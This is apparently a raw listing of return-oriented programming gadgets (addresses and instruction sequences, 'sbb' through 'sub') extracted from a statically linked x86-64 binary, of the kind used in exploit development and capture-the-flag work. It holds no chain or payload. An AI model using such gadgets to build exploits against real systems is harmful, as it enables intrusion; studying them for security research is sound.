0x0000000000474965 : sbb eax, 0x8948ffff ; add ebx, dword ptr [rax + 0x5a] ; pop rbx ; ret
0x000000000044c142 : sbb eax, dword ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0x481e
0x0000000000402720 : sbb eax, dword ptr [rcx] ; add byte ptr [rax - 0x77], cl ; ret 0x7be9
0x000000000046d9ea : sbb eax, eax ; and eax, 2 ; sub eax, 1 ; ret
0x000000000041e307 : sbb eax, eax ; or eax, 1 ; ret
0x0000000000477faf : sbb eax, eax ; ret
0x00000000004388c5 : sbb eax, eax ; sbb eax, -1 ; ret
0x0000000000416881 : sbb ebp, dword ptr [rip + 0xf480002] ; ret 0x66c3
0x000000000041026e : scasb al, byte ptr [rdi] ; adc eax, 0x39480029 ; ret
0x000000000041d3a2 : scasb al, byte ptr [rdi] ; add byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x0000000000431e3e : scasb al, byte ptr [rdi] ; add eax, 0x83480000 ; ret 0xe910
0x000000000047b149 : scasb al, byte ptr [rdi] ; clc ; call rbx
0x000000000047b1a9 : scasb al, byte ptr [rdi] ; clc ; jmp qword ptr [rcx]
0x000000000047b145 : scasb al, byte ptr [rdi] ; clc ; ljmp [rbx] ; scasb al, byte ptr [rdi] ; clc ; call rbx
0x000000000047cea1 : scasb al, byte ptr [rdi] ; cli ; call qword ptr [rdx]
0x000000000047cd65 : scasb al, byte ptr [rdi] ; cli ; call rsp
0x000000000047cd61 : scasb al, byte ptr [rdi] ; cli ; inc dword ptr [rsi + rbp*4 - 6] ; call rsp
0x000000000047ce21 : scasb al, byte ptr [rdi] ; cli ; jmp qword ptr [rsi]
0x0000000000431f3d : scasd eax, dword ptr [rdi] ; add al, 0 ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x000000000047ce1d : scasd eax, dword ptr [rdi] ; cli ; call qword ptr [rsi + 0x26fffaae]
0x000000000040c03e : scasd eax, dword ptr [rdi] ; nop ; xor eax, eax ; ret
0x00000000004073bb : scasd eax, dword ptr [rdi] ; ret
0x000000000044a7ae : scasd eax, dword ptr [rdi] ; ret 0x148
0x0000000000409406 : scasd eax, dword ptr [rdi] ; ret 0x2948
0x0000000000410bc9 : scasd eax, dword ptr [rdi] ; ret 0x8948
0x000000000043a78b : scasd eax, dword ptr [rdi] ; ret 0xda89
0x000000000043a79c : scasd eax, dword ptr [rdi] ; ret 0xffe9
0x000000000043a799 : scasd eax, dword ptr [rdi] ; ror dword ptr [rdi], 0xaf ; ret 0xffe9
0x000000000043d9ac : setae al ; ret
0x000000000044a4da : sete dh ; mov dword ptr [rbx + 0x40], esi ; xor eax, eax ; pop rbx ; ret
0x000000000040c06c : setne al ; movzx eax, al ; neg eax ; pop rbx ; ret
0x000000000040ee5c : setne al ; neg eax ; ret
0x000000000043eed0 : setne dl ; jmp 0x43eeb8
0x000000000047a817 : shl byte ptr [rax + 0x1e], 0x96 ; dec dword ptr [rax - 0x39] ; ret 0xf400
0x000000000047a7ee : shl byte ptr [rax + 0x1e], 0x96 ; dec dword ptr [rax - 0x39] ; ret 0xf6c0
0x000000000047a840 : shl byte ptr [rax + 0x1e], 0x96 ; dec dword ptr [rax - 0x39] ; ret 0xfc00
0x000000000047a869 : shl byte ptr [rax + 0x1e], 0x96 ; dec dword ptr [rax - 0x39] ; ret 0xfc60
0x000000000047a892 : shl byte ptr [rax + 0x1e], 0x96 ; dec dword ptr [rax - 0x39] ; ret 0xfce0
0x000000000047a8bb : shl byte ptr [rax + 0x1e], 0x96 ; dec dword ptr [rax - 0x39] ; ret 0xfda0
0x000000000047a8e4 : shl byte ptr [rax + 0x1e], 0x96 ; dec dword ptr [rax - 0x39] ; ret 0xfe20
0x000000000047a90d : shl byte ptr [rax + 0x1e], 0x96 ; dec dword ptr [rax - 0x39] ; ret 0xfe80
0x000000000047a74d : shl byte ptr [rax + 0x1e], 0x96 ; dec dword ptr [rax - 0x39] ; ret 0xff40
0x000000000041dbeb : shl byte ptr [rax + 0x48], 1 ; clc ; vzeroupper ; ret
0x000000000047a776 : shl byte ptr [rax + 0x48ffffff], 0xc7 ; ret 0xe240
0x000000000041dbab : shl byte ptr [rax], 0x48 ; add eax, edi ; vzeroupper ; ret
0x000000000047d7a0 : shl byte ptr [rbx], 1 ; sti ; push qword ptr [rax + 0x25] ; sti ; call qword ptr [rax]
0x0000000000438b0f : shl byte ptr [rsi + 0x44], 0xf ; out dx, eax ; ret 0xf66
0x0000000000436eb3 : shl byte ptr [rsi + 0xf], 0xd7 ; ror dword ptr [rcx], cl ; ret 0xe074
0x0000000000432665 : shl byte ptr [rsi + 0xf], 0xeb ; ret 0xf66
0x000000000041fb1b : shl byte ptr [rsi + 0xf], 0xef ; shl dword ptr [rsi + 0xf], 1 ; cmp byte ptr [rdi], dl ; ret 0x5173
0x000000000041fb32 : shl byte ptr [rsi + 0xf], 1 ; out dx, eax ; shl dword ptr [rsi + 0xf], 1 ; cmp byte ptr [rdi], dl ; ret 0x3a73
0x000000000045fbd6 : shl byte ptr [rsi + 0xf], 1 ; outsd dx, dword ptr [rsi] ; ret
0x000000000045fbe7 : shl byte ptr [rsi + 0xf], 1 ; outsd dx, dword ptr [rsi] ; ret 0xf66
0x000000000041fa11 : shl byte ptr [rsi + 0xf], cl ; out dx, eax ; shl dword ptr [rsi + 0xf], 1 ; cmp byte ptr [rdi], dl ; ret 0x830f
0x0000000000488730 : shl dword ptr [rax + rax], 0 ; add byte ptr [rax], al ; add byte ptr [rax], al ; ret 0x24
0x0000000000490128 : shl dword ptr [rdi - 5], 1 ; ret
0x000000000045fbd2 : shl dword ptr [rsi + 0xf], 0xd7 ; shl byte ptr [rsi + 0xf], 1 ; outsd dx, dword ptr [rsi] ; ret
0x000000000043896b : shl dword ptr [rsi + 0xf], 0xda ; ret
0x000000000041fa96 : shl dword ptr [rsi + 0xf], 0xef ; shl dword ptr [rsi + 0xf], 1 ; cmp byte ptr [rdi], dl ; ret 0x830f
0x000000000041fb4d : shl dword ptr [rsi + 0xf], 1 ; cmp byte ptr [rdi], dl ; ret 0x2373
0x000000000041fb36 : shl dword ptr [rsi + 0xf], 1 ; cmp byte ptr [rdi], dl ; ret 0x3a73
0x000000000041fb1f : shl dword ptr [rsi + 0xf], 1 ; cmp byte ptr [rdi], dl ; ret 0x5173
0x000000000041e5db : shl dword ptr [rsi + 0xf], 1 ; cmp byte ptr [rdi], dl ; ret 0x830f
0x000000000041fab1 : shl dword ptr [rsi + 0xf], 1 ; out dx, eax ; shl dword ptr [rsi + 0xf], 1 ; cmp byte ptr [rdi], dl ; ret 0x830f
0x000000000041d53c : shl dword ptr [rsi + 0xf], 1 ; xlatb ; ret 0xc085
0x000000000041f971 : shl dword ptr [rsi + 0xf], cl ; out dx, eax ; shl dword ptr [rsi + 0xf], 1 ; cmp byte ptr [rdi], dl ; ret 0x830f
0x000000000043fb61 : shl eax, cl ; pop rbp ; pop r12 ; ret
0x000000000043fb5d : shl ecx, 3 ; pop rbx ; shl eax, cl ; pop rbp ; pop r12 ; ret
0x000000000046defc : shl ecx, cl ; mov qword ptr [rdi - 0x10], r9 ; ret
0x000000000046de87 : shl ecx, cl ; mov qword ptr [rdi - 8], r9 ; ret
0x000000000046de56 : shl ecx, cl ; mov qword ptr [rdi], r9 ; ret
0x0000000000471ba3 : shl edx, 5 ; add rdx, rax ; jmp 0x471bb9
0x000000000046defb : shl r9, cl ; mov qword ptr [rdi - 0x10], r9 ; ret
0x000000000046de86 : shl r9, cl ; mov qword ptr [rdi - 8], r9 ; ret
0x000000000046de55 : shl r9, cl ; mov qword ptr [rdi], r9 ; ret
0x0000000000471ba2 : shl rdx, 5 ; add rdx, rax ; jmp 0x471bba
0x00000000004974b0 : shr ah, 0xf9 ; jmp qword ptr [rbx]
0x000000000047d72c : shr al, 0xfa ; call rax
0x0000000000461801 : shr bl, 0xb9 ; call 0x43dad5
0x000000000047cde8 : shr byte ptr [rbp - 0x52af0006], 0xfa ; jmp rax
0x00000000004009fd : shr byte ptr [rbx], 1 ; push 0 ; jmp rax
0x000000000041826f : shr byte ptr [rcx], 0xc8 ; ret
0x000000000041681a : shr byte ptr [rcx], cl ; add al, byte ptr [rax] ; cmovne rax, rdx ; ret
0x00000000004479b8 : shr byte ptr [rcx], cl ; ret
0x000000000041deab : shr byte ptr [rcx], cl ; rol bl, 1 ; nop ; xor eax, eax ; ret
0x00000000004044a8 : shr cl, 1 ; ret
0x0000000000476f02 : shr cl, 1 ; ret 0xfffe
0x0000000000476a0f : shr cl, cl ; ret
0x000000000047d730 : shr dl, 1 ; cli ; jmp rax
0x000000000043a48a : shr eax, 0xe ; and eax, 0x3fc00 ; pop rbx ; ret
0x0000000000460c8b : shr eax, 2 ; ret
0x0000000000461193 : shr eax, 2 ; vzeroupper ; ret
0x000000000043a4d5 : shr eax, 6 ; and eax, 0x3fffc00 ; pop rbx ; ret
0x00000000004134fe : shr ecx, 3 ; rep stosq qword ptr [rdi], rax ; pop rbx ; ret
0x000000000046e00c : shr ecx, cl ; mov qword ptr [rdi + 0x10], r9 ; ret
0x000000000046df91 : shr ecx, cl ; mov qword ptr [rdi + 8], r9 ; ret
0x000000000046df60 : shr ecx, cl ; mov qword ptr [rdi], r9 ; ret
0x000000000046e00b : shr r9, cl ; mov qword ptr [rdi + 0x10], r9 ; ret
0x000000000046df90 : shr r9, cl ; mov qword ptr [rdi + 8], r9 ; ret
0x000000000046df5f : shr r9, cl ; mov qword ptr [rdi], r9 ; ret
0x0000000000460c8a : shr rax, 2 ; ret
0x0000000000461192 : shr rax, 2 ; vzeroupper ; ret
0x00000000004658d1 : sldt word ptr [rax] ; add byte ptr [rax - 0x77], cl ; fucomip st(0) ; ret
0x0000000000487909 : sldt word ptr [rax] ; ret
0x00000000004604d6 : stc ; add byte ptr [rax + rax], cl ; add byte ptr [rbx + rax - 0xd], dh ; ret
0x000000000044f1fd : stc ; and al, 0 ; mov rax, qword ptr [rax + rdi*8] ; jmp rax
0x0000000000497322 : stc ; call qword ptr [rax]
0x000000000047c686 : stc ; call rax
0x00000000004630f6 : stc ; dec dword ptr [rax + 0x39] ; ret
0x0000000000464d76 : stc ; dec dword ptr [rax - 0x77] ; ret
0x0000000000475cb2 : stc ; in al, 0x22 ; add byte ptr [rax], cl ; ret
0x000000000047c67e : stc ; inc dword ptr [rax - 0x5f00066c] ; xchg eax, esp ; stc ; call rax
0x0000000000430ef2 : stc ; je 0x430ebe ; lea r10, [r10 + r9] ; jmp r10
0x000000000047c682 : stc ; jmp qword ptr [rax - 0x2f00066c]
0x000000000047c672 : stc ; jmp qword ptr [rax]
0x00000000004974b2 : stc ; jmp qword ptr [rbx]
0x0000000000497336 : stc ; jmp qword ptr [rsi]
0x000000000048ffa4 : stc ; jnp 0x48ff63 ; ret
0x00000000004223f8 : stc ; mov dword ptr [rdi - 4], ecx ; ret
0x000000000045610e : stc ; or dword ptr [rsi - 0x2f], esi ; mov qword ptr [rdi], rsi ; ret
0x000000000047aad8 : stc ; push rbx ; ret
0x000000000042ad14 : stc ; vmovups zmmword ptr [rdi - 0x200], zmm15 ; ret
0x000000000041e387 : stc ; xlatb ; ret 0xff2d
0x000000000048d65a : std ; call qword ptr [rax]
0x0000000000492ff6 : std ; call qword ptr [rbx]
0x000000000049d1d2 : std ; call qword ptr [rdx]
0x000000000049c57e : std ; call rdi
0x000000000049bfde : std ; call rdx
0x000000000048c41d : std ; cld ; call rsp
0x000000000048c365 : std ; cld ; jmp rsp
0x000000000048c3a9 : std ; cld ; lcall [rbp + rdi*8 - 4] ; jmp rsp
0x000000000048c379 : std ; cld ; ljmp [rbp + rdi*8 - 4] ; jmp rsp
0x0000000000462b22 : std ; dec dword ptr [rax + 0x39] ; ret
0x00000000004604f8 : std ; dec dword ptr [rax + 0xf] ; ret 0x90c3
0x000000000043c41e : std ; dec dword ptr [rax - 0x77] ; ret
0x0000000000492ffe : std ; dec esp ; leave ; std ; jmp rsp
0x000000000046777e : std ; inc dword ptr [rbp + 0x5b0e78c0] ; ret
0x000000000046d88b : std ; inc dword ptr [rbp - 0x76b08a40] ; ret
0x000000000046d0be : std ; jbe 0x46d0cc ; ret
0x000000000048c62e : std ; jmp qword ptr [rax]
0x000000000049bfca : std ; jmp qword ptr [rcx]
0x000000000049c2da : std ; jmp qword ptr [rdi]
0x000000000049c74a : std ; jmp qword ptr [rdx]
0x000000000049c0aa : std ; jmp qword ptr [rsi]
0x000000000048d5be : std ; jmp rax
0x000000000049c83a : std ; jmp rdx
0x000000000048c4e6 : std ; jmp rsp
0x000000000048d5ba : std ; lcall [rbp - 0x1f000247] ; test al, 0xfd ; jmp qword ptr [rax]
0x0000000000492fee : std ; lcall [rcx + rcx*8 - 0x36530003] ; std ; call qword ptr [rbx]
0x000000000048c626 : std ; ljmp [rax + 0x60fffd01] ; add bh, ch ; jmp qword ptr [rax]
0x000000000048c4e2 : std ; ljmp [rax + rax - 3] ; jmp rsp
0x000000000048c4de : std ; ljmp [rax + rax - 3] ; ljmp [rax + rax - 3] ; jmp rsp
0x0000000000421c1b : std ; mov word ptr [rdi - 2], cx ; ret
0x0000000000439273 : std ; rep movsb byte ptr [rdi], byte ptr [rsi] ; cld ; ret
0x000000000047e759 : std ; sti ; call qword ptr [rax]
0x000000000041dc51 : std ; xlatb ; ret
0x000000000041dc49 : std ; xlatb ; ret 0xc085
0x000000000041e1c3 : std ; xlatb ; ret 0xe883
0x000000000045fde4 : std ; xlatb ; rol ch, cl ; std ; xlatb ; ret
0x00000000004094e3 : sti ; add cl, byte ptr [rax + 0xf] ; scasd eax, dword ptr [rdi] ; ret
0x000000000047d816 : sti ; call qword ptr [rax + 0x20fffb4a]
0x000000000047d7b6 : sti ; call qword ptr [rax + 0x30fffb2d]
0x000000000047d836 : sti ; call qword ptr [rax]
0x0000000000499902 : sti ; call qword ptr [rbx]
0x000000000049961a : sti ; call qword ptr [rcx]
0x0000000000499602 : sti ; call qword ptr [rdi]
0x000000000047df0a : sti ; call qword ptr [rdx]
0x000000000047d826 : sti ; call rax
0x000000000047d9de : sti ; call rsi
0x000000000047e1ca : sti ; call rsp
0x000000000048c361 : sti ; cld ; ljmp [rbp + rdi*8 - 4] ; jmp rsp
0x0000000000499461 : sti ; cli ; call rsp
0x000000000044b9f6 : sti ; dec dword ptr [rax + 0x29] ; ret
0x000000000044ac25 : sti ; dec dword ptr [rbp - 0x7b] ; dec dword ptr [rax - 0x77] ; ret
0x000000000047df6a : sti ; dec dword ptr [rdi] ; fdivr st(3) ; jmp rdx
0x000000000047d812 : sti ; inc dword ptr [rax + 0x49] ; sti ; call qword ptr [rax + 0x20fffb4a]
0x000000000047e1be : sti ; inc dword ptr [rax + rbx*8 - 0x277b0005] ; sti ; call rsp
0x000000000047e1c2 : sti ; inc dword ptr [rax + rbx*8 - 0x292b0005] ; sti ; call rsp
0x000000000047d7e2 : sti ; inc dword ptr [rax - 0x2f0004c7] ; cmp bh, bl ; jmp qword ptr [rax]
0x000000000047d992 : sti ; inc dword ptr [rax - 0x67000435] ; retf ; sti ; call rax
0x0000000000449377 : sti ; inc dword ptr [rbx - 0x76be0008] ; ret 0x840f
0x0000000000444552 : sti ; inc dword ptr [rcx - 0x45] ; add eax, 0xe9000000 ; ret 0xfffc
0x0000000000446cf9 : sti ; inc dword ptr [rcx - 0x77] ; ret 0x17e9
0x000000000047d7f2 : sti ; inc eax ; sti ; call qword ptr [rax]
0x000000000047d8de : sti ; inc eax ; xchg eax, ebx ; sti ; call rax
0x000000000047d8b6 : sti ; inc eax ; xchg eax, edx ; sti ; call rax
0x000000000047d882 : sti ; jmp qword ptr [rax - 0x3f000472]
0x000000000047d7ea : sti ; jmp qword ptr [rax]
0x000000000047de2a : sti ; jmp qword ptr [rsi]
0x000000000047d88a : sti ; jmp rax
0x000000000047df6e : sti ; jmp rdx
0x000000000047de36 : sti ; jmp rsp
0x000000000047d9d6 : sti ; ljmp [rbx + rcx*8 - 0x34760005] ; sti ; call rsi
0x000000000047df7e : sti ; ljmp [rdx + 0x62fffbd7] ; xlatb ; sti ; jmp rsp
0x0000000000458ab7 : sti ; loop 0x458abf ; dec dword ptr [rcx + 0x63] ; ret
0x0000000000421ff8 : sti ; mov dword ptr [rdi - 4], ecx ; ret
0x000000000047d7a2 : sti ; push qword ptr [rax + 0x25] ; sti ; call qword ptr [rax]
0x000000000047d7c2 : sti ; push qword ptr [rax + 0x32] ; sti ; call qword ptr [rax]
0x000000000047d7ee : sti ; push qword ptr [rax + 0x3d] ; sti ; inc eax ; sti ; call qword ptr [rax]
0x000000000047d8da : sti ; push qword ptr [rax - 0x3f00046d] ; xchg eax, ebx ; sti ; call rax
0x000000000047d79a : sti ; push qword ptr [rax] ; and bh, bl ; call rax
0x000000000047d8e6 : sti ; push rax ; xchg eax, ebx ; sti ; call qword ptr [rax]
0x000000000047d8c2 : sti ; push rax ; xchg eax, edx ; sti ; call qword ptr [rax]
0x000000000047d906 : sti ; push rax ; xchg eax, esp ; sti ; call qword ptr [rax]
0x000000000049012a : sti ; ret
0x0000000000414269 : sti ; sub byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; ret
0x0000000000449d47 : sti ; test rax, rax ; je 0x449d55 ; call rax
0x000000000043a4e5 : sti ; xor al, 4 ; add cl, al ; call 0xffffffff84062e03
0x0000000000479913 : stosb byte ptr [rdi], al ; and al, byte ptr [rax] ; add dword ptr [rax], eax ; add byte ptr [rax], al ; ret
0x0000000000479905 : stosb byte ptr [rdi], al ; and al, byte ptr [rax] ; test eax, eax ; je 0x479918 ; ret
0x000000000046f4ba : stosb byte ptr [rdi], al ; and rax, qword ptr [r8] ; ret
0x000000000047ce09 : stosb byte ptr [rdi], al ; cli ; call rax
0x000000000047ce05 : stosb byte ptr [rdi], al ; cli ; inc dword ptr [rax - 0x56] ; cli ; call rax
0x000000000047cec5 : stosb byte ptr [rdi], al ; cli ; jmp qword ptr [rdx]
0x000000000047cd89 : stosb byte ptr [rdi], al ; cli ; jmp rsp
0x0000000000490604 : stosb byte ptr [rdi], al ; cli ; ret 0xac65
0x0000000000439f9b : stosb byte ptr [rdi], al ; mov rax, rdx ; ret
0x000000000044a30a : stosb byte ptr [rdi], al ; xchg dword ptr [rip - 0xcf78c00], esp ; ret
0x0000000000479803 : stosd dword ptr [rdi], eax ; and al, byte ptr [rax] ; add dword ptr [rax], eax ; add byte ptr [rax], al ; ret
0x00000000004797f5 : stosd dword ptr [rdi], eax ; and al, byte ptr [rax] ; test eax, eax ; je 0x479808 ; ret
0x0000000000416731 : stosd dword ptr [rdi], eax ; and dword ptr [rdx], eax ; add byte ptr [rax + 0xf], cl ; ret 0x66c3
0x00000000004676a1 : stosd dword ptr [rdi], eax ; and eax, dword ptr [rax] ; xor eax, eax ; add rsp, 8 ; ret
0x000000000047cec1 : stosd dword ptr [rdi], eax ; cli ; call qword ptr [rdx + 0x22fffaaa]
0x000000000047ce3d : stosd dword ptr [rdi], eax ; cli ; call qword ptr [rsi]
0x000000000047cdfd : stosd dword ptr [rdi], eax ; cli ; jmp qword ptr [rax]
0x000000000047a441 : stosd dword ptr [rdi], eax ; cwde ; and al, byte ptr [rax] ; jne 0x47a42f ; pop rbx ; ret
0x0000000000455e2e : stosd dword ptr [rdi], eax ; mov eax, 1 ; ret
0x0000000000413503 : stosd dword ptr [rdi], eax ; pop rbx ; ret
0x000000000049170c : stosd dword ptr [rdi], eax ; ret
0x00000000004169e1 : stosd dword ptr [rdi], eax ; sub eax, dword ptr [rdx] ; add byte ptr [rax + 0xf], cl ; ret 0x66c3
0x0000000000413502 : stosq qword ptr [rdi], rax ; pop rbx ; ret
0x0000000000491af1 : sub ah, ah ; mov bh, 6 ; movsd dword ptr [rdi], dword ptr [rsi] ; int1 ; ret 0x5803
0x000000000045334b : sub al, 0x6a ; add byte ptr [rax - 0x39], cl ; ret 0x32c8
0x0000000000458d14 : sub al, 0x6a ; add byte ptr [rax - 0x77], cl ; ret 0x8148
0x000000000043a1d2 : sub al, 0x72 ; add cl, byte ptr [rax + 0x77f8c50f] ; ret
0x000000000047d098 : sub al, 0x9e ; cli ; call rdx
0x000000000041f163 : sub al, 0xa ; add byte ptr [rax], al ; xor eax, eax ; ret
0x0000000000498e14 : sub al, 0xbd ; cli ; jmp qword ptr [rdx]
0x0000000000493e65 : sub al, 0xfe ; call qword ptr [rip + 0x20fffe2c]
0x0000000000493e69 : sub al, 0xfe ; jmp qword ptr [rax]
0x000000000044dc86 : sub al, 1 ; add byte ptr [rax - 0x7d], cl ; clc ; dec dword ptr [rax - 0x77] ; ret
0x000000000044a825 : sub al, 7 ; mov rdi, rbp ; call r12
0x0000000000400a7a : sub al, byte ptr [rax] ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x00000000004004cc : sub al, byte ptr [rax] ; nop ; ret
0x0000000000401314 : sub al, byte ptr [rax] ; or byte ptr [rdi], cl ; ret 0x589
0x00000000004167da : sub al, byte ptr [rdx] ; add bh, dh ; ret 0
0x0000000000416b22 : sub al, byte ptr [rdx] ; add byte ptr [rax + 0xf], cl ; ret 0x66c3
0x000000000041e525 : sub al, ch ; std ; xlatb ; ret
0x00000000004977b9 : sub bh, dl ; call qword ptr [rbx]
0x000000000043dc13 : sub byte ptr [r9], r8b ; ret
0x0000000000463a20 : sub byte ptr [rax + 0x39], cl ; ret 0x870f
0x0000000000463a1f : sub byte ptr [rax + 0x39], r9b ; ret 0x870f
0x000000000046e815 : sub byte ptr [rax + 1], cl ; ret 0x3d74
0x0000000000465eb7 : sub byte ptr [rax - 0x3f], cl ; clc ; add dl, byte ptr [rax - 0x77] ; ret 0xc389
0x000000000044a7a7 : sub byte ptr [rax - 0x73], cl ; dec dword ptr [rax + 0xf] ; scasd eax, dword ptr [rdi] ; ret 0x148
0x000000000044a904 : sub byte ptr [rax - 0x75], cl ; je 0x44a935 ; sbb byte ptr [rax + 1], cl ; ret
0x0000000000411b24 : sub byte ptr [rax - 0x77], cl ; and cl, bpl ; ret 0xfffc
0x0000000000415134 : sub byte ptr [rax - 0x77], cl ; out dx, eax ; call rax
0x000000000047650c : sub byte ptr [rax - 0x77], cl ; ret
0x000000000045cab4 : sub byte ptr [rax - 0x77], cl ; ret 0xc148
0x0000000000405a60 : sub byte ptr [rax - 0x7d], cl ; ret
0x0000000000464cbb : sub byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret 0x4801
0x000000000041426a : sub byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; ret
0x000000000046eead : sub byte ptr [rax], al ; add byte ptr [rax], al ; jne 0x46eef5 ; leave ; ret
0x00000000004167fc : sub byte ptr [rax], al ; add dh, byte ptr [rax + rcx - 9] ; ret 0
0x00000000004142ca : sub byte ptr [rax], al ; ret
0x0000000000497764 : sub byte ptr [rax], bh ; add byte ptr [rax], al ; js 0x49779a ; cli ; call qword ptr [rbx]
0x0000000000465724 : sub byte ptr [rax], cl ; add byte ptr [rax], al ; call 0x4019f6
0x0000000000447b1d : sub byte ptr [rbx + rcx*4 + 0x35], cl ; push rbx ; ret
0x0000000000472a33 : sub byte ptr [rbx - 0x26], dh ; mov eax, 1 ; ret
0x0000000000472a32 : sub byte ptr [rbx - 0x26], sil ; mov eax, 1 ; ret
0x0000000000498264 : sub byte ptr [rbx], al ; add byte ptr [rax + 0x58], bl ; cli ; call qword ptr [rax]
0x0000000000499264 : sub byte ptr [rbx], dl ; add byte ptr [rax], ch ; cli ; call qword ptr [rdx]
0x000000000046d9b5 : sub byte ptr [rcx - 0x3b76b310], cl ; mov rbp, r9 ; jmp rdx
0x00000000004561a5 : sub byte ptr [rcx - 0x77], cl ; ret 0x894d
0x0000000000462ffa : sub byte ptr [rcx], al ; add byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret
0x000000000043dc14 : sub byte ptr [rcx], al ; ret
0x0000000000498168 : sub byte ptr [rdi - 6], dl ; call qword ptr [rcx]
0x0000000000479904 : sub byte ptr [rdx - 0x3f7affde], 0x74 ; add al, 0xf3 ; ret
0x000000000041693a : sub byte ptr [rdx], al ; add bh, dh ; ret 0
0x000000000041697b : sub byte ptr [rdx], al ; add byte ptr [rax + 0xf], cl ; ret 0xfc3
0x0000000000498164 : sub byte ptr [rdx], al ; add byte ptr [rax], ch ; push rdi ; cli ; call qword ptr [rcx]
0x0000000000400a79 : sub byte ptr [rdx], ch ; add byte ptr [rcx], al ; pop rbp ; ret
0x0000000000401cd7 : sub cl, byte ptr [rax - 0x77] ; ret
0x00000000004070cd : sub cl, byte ptr [rax - 0x77] ; ror byte ptr [rax - 0x7d], 1 ; ret 0x4801
0x0000000000458ab5 : sub cl, ch ; sti ; loop 0x458ac1 ; dec dword ptr [rcx + 0x63] ; ret
0x000000000044c6f1 : sub dh, al ; add byte ptr [rcx - 0x7d], cl ; ret
0x0000000000497719 : sub dl, bh ; call qword ptr [rax]
0x00000000004976dd : sub dl, bh ; call qword ptr [rdx]
0x000000000049772d : sub dl, bh ; jmp rbx
0x000000000046bb1a : sub dl, dh ; call r11
0x0000000000499268 : sub dl, dh ; cli ; call qword ptr [rdx]
0x000000000040f5f6 : sub dword ptr [r8], r8d ; ret
0x0000000000403116 : sub dword ptr [rax], eax ; add byte ptr [rax - 0x77], cl ; ret
0x000000000040ede0 : sub dword ptr [rax], eax ; add byte ptr [rax], al ; add byte ptr [rax], al ; ret
0x000000000040a445 : sub dword ptr [rax], eax ; add byte ptr [rdx + rax - 0xd], dh ; ret
0x000000000040f5a6 : sub dword ptr [rax], eax ; add dword ptr [rax], eax ; add byte ptr [rax], al ; ret
0x000000000040ed76 : sub dword ptr [rax], eax ; add dword ptr [rip + 0x294f95], 1 ; ret
0x000000000040ece5 : sub dword ptr [rax], eax ; ret
0x0000000000465761 : sub dword ptr [rax], ecx ; add byte ptr [rax], al ; call 0x4019f6
0x000000000043b113 : sub dword ptr [rcx], esi ; add byte ptr es:[rax + 0x39], cl ; ret
0x0000000000420247 : sub dword ptr [rdi + 0x10], ebx ; jb 0x42025d ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x0000000000420397 : sub dword ptr [rdi + 0x10], ebx ; jb 0x4203ad ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x00000000004204e7 : sub dword ptr [rdi + 0x10], ebx ; jb 0x4204fd ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x0000000000420637 : sub dword ptr [rdi + 0x10], ebx ; jb 0x42064d ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x0000000000420787 : sub dword ptr [rdi + 0x10], ebx ; jb 0x42079d ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x00000000004208d7 : sub dword ptr [rdi + 0x10], ebx ; jb 0x4208ed ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x0000000000420a27 : sub dword ptr [rdi + 0x10], ebx ; jb 0x420a3d ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x0000000000420b77 : sub dword ptr [rdi + 0x10], ebx ; jb 0x420b8d ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x0000000000420cc7 : sub dword ptr [rdi + 0x10], ebx ; jb 0x420cdd ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x0000000000420e17 : sub dword ptr [rdi + 0x10], ebx ; jb 0x420e2d ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x0000000000420f67 : sub dword ptr [rdi + 0x10], ebx ; jb 0x420f7d ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x00000000004210b7 : sub dword ptr [rdi + 0x10], ebx ; jb 0x4210cd ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x0000000000421207 : sub dword ptr [rdi + 0x10], ebx ; jb 0x42121d ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x0000000000421357 : sub dword ptr [rdi + 0x10], ebx ; jb 0x42136d ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x00000000004214a7 : sub dword ptr [rdi + 0x10], ebx ; jb 0x4214bd ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x0000000000422c17 : sub dword ptr [rdi + 0x10], ebx ; jb 0x422c2d ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x0000000000422d67 : sub dword ptr [rdi + 0x10], ebx ; jb 0x422d7d ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x0000000000422eb7 : sub dword ptr [rdi + 0x10], ebx ; jb 0x422ecd ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x0000000000423007 : sub dword ptr [rdi + 0x10], ebx ; jb 0x42301d ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x0000000000423157 : sub dword ptr [rdi + 0x10], ebx ; jb 0x42316d ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x00000000004232a7 : sub dword ptr [rdi + 0x10], ebx ; jb 0x4232bd ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x00000000004233f7 : sub dword ptr [rdi + 0x10], ebx ; jb 0x42340d ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x0000000000423547 : sub dword ptr [rdi + 0x10], ebx ; jb 0x42355d ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x0000000000423697 : sub dword ptr [rdi + 0x10], ebx ; jb 0x4236ad ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x00000000004237e7 : sub dword ptr [rdi + 0x10], ebx ; jb 0x4237fd ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x0000000000423937 : sub dword ptr [rdi + 0x10], ebx ; jb 0x42394d ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
